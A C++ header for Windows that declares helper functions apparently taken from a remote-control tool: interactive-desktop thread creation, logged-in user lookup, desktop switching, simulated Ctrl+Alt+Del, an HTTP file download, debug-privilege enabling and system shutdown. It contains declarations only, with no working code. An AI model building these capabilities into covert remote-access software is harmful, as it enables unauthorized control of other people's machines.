#pragma once
#if !defined(AFX_UNTIL_H_INCLUDED)
#define AFX_UNTIL_H_INCLUDED

typedef struct _THREAD_ARGLIST
{
	unsigned(__stdcall *start_address)(void *);
	void	*arglist;
	bool	bInteractive; // 是否支持交互桌面
	HANDLE	hEventTransferArg;
}THREAD_ARGLIST, *LPTHREAD_ARGLIST;

unsigned int __stdcall ThreadLoader(LPVOID param);

HANDLE MyCreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
	SIZE_T dwStackSize,                       // initial stack size
	LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
	LPVOID lpParameter,                       // thread argument
	DWORD dwCreationFlags,                    // creation option
	LPDWORD lpThreadId, bool bInteractive = false);

DWORD GetProcessID(LPCTSTR lpProcessName);
TCHAR *GetLogUserXP();
TCHAR *GetLogUser2K();
TCHAR *GetCurrentLoginUser();

bool SwitchInputDesktop();

BOOL SelectHDESK(HDESK new_desktop);
BOOL WINAPI SelectDesktop(TCHAR *name);
BOOL SimulateCtrlAltDel();
bool http_get(LPCTSTR szURL, LPCTSTR szFileName);

bool DebugPrivilege(const TCHAR *PName, BOOL bEnable);
void ShutdownWindows(DWORD dwReason);

#endif // !defined(AFX_UNTIL_H_INCLUDED)